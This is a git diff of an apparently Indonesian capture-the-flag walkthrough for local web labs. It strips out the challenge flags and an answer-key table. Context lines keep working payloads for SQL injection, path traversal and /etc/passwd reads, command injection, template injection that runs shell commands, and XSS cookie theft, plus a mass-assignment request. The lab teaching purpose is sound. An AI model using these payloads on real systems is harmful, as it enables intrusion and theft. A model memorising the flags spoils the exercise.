@@ -76,8 +76,6 @@ admin' OR '1'='1' --
 ' OR 1=1 --
 ```
 
-**Flag:** `CyberJateng{sql_1nj3ct10n_m4st3r_2026}`
-
 </details>
 
 ---
@@ -109,8 +107,6 @@ http://localhost:10102/?page=../../../../flag.txt
 http://localhost:10102/?page=../../../flag.txt
 ```
 
-**Flag:** `CyberJateng{l0c4l_f1l3_1nclus10n_pwn3d}`
-
 </details>
 
 ---
@@ -141,8 +137,6 @@ http://localhost:10103/?file=/flag.txt
 ```
 http://localhost:10103/?file=/etc/passwd
 ```
-
-**Flag:** `CyberJateng{f1l3_d1scl0sur3_1s_d4ng3r0us}`
 
 </details>
 
@@ -183,8 +177,6 @@ Tool ping yang menjalankan command shell. Tujuan: eksekusi command untuk membaca
 ; id
 ; whoami
 ```
-
-**Flag:** `CyberJateng{r3m0t3_c0d3_3x3cut10n_1s_cr1t1c4l}`
 
 </details>
 
@@ -228,8 +220,6 @@ Jika output menampilkan `49`, SSTI confirmed!
 {{''.__class__.__mro__[1].__subclasses__()[287]('cat /flag.txt',shell=True,stdout=-1).communicate()[0]}}
 ```
 
-**Flag:** `CyberJateng{sst1_t3mpl4t3_1nj3ct10n_g0t_y0u}`
-
 </details>
 
 ---
@@ -270,8 +260,6 @@ http://localhost/
 ```
 
 **Step 4:** Tunggu beberapa detik, admin bot akan mengunjungi dan cookie akan dikirim ke webhook.
-
-**Flag:** `CyberJateng{x55_c00k13_st34l3r_succ3ss}`
 
 </details>
 
@@ -317,25 +305,7 @@ curl -X POST http://localhost:10107/register.php \
 
 **Step 3:** Flag akan muncul di Admin Panel pada dashboard
 
-**Flag:** `CyberJateng{m4ss_4ss1gnm3nt_pr1v1l3g3_3sc4l4t10n}`
-
 </details>
-
----
-
-## 🎯 Semua Flag
-
-| Challenge | Flag |
-|-----------|------|
-| SQL Injection | `CyberJateng{sql_1nj3ct10n_m4st3r_2026}` |
-| LFI | `CyberJateng{l0c4l_f1l3_1nclus10n_pwn3d}` |
-| LFD | `CyberJateng{f1l3_d1scl0sur3_1s_d4ng3r0us}` |
-| RCE | `CyberJateng{r3m0t3_c0d3_3x3cut10n_1s_cr1t1c4l}` |
-| SSTI | `CyberJateng{sst1_t3mpl4t3_1nj3ct10n_g0t_y0u}` |
-| XSS | `CyberJateng{x55_c00k13_st34l3r_succ3ss}` |
-| Mass Assignment | `CyberJateng{m4ss_4ss1gnm3nt_pr1v1l3g3_3sc4l4t10n}` |
-
----
 
 ## 📖 Penjelasan Vulnerability
 
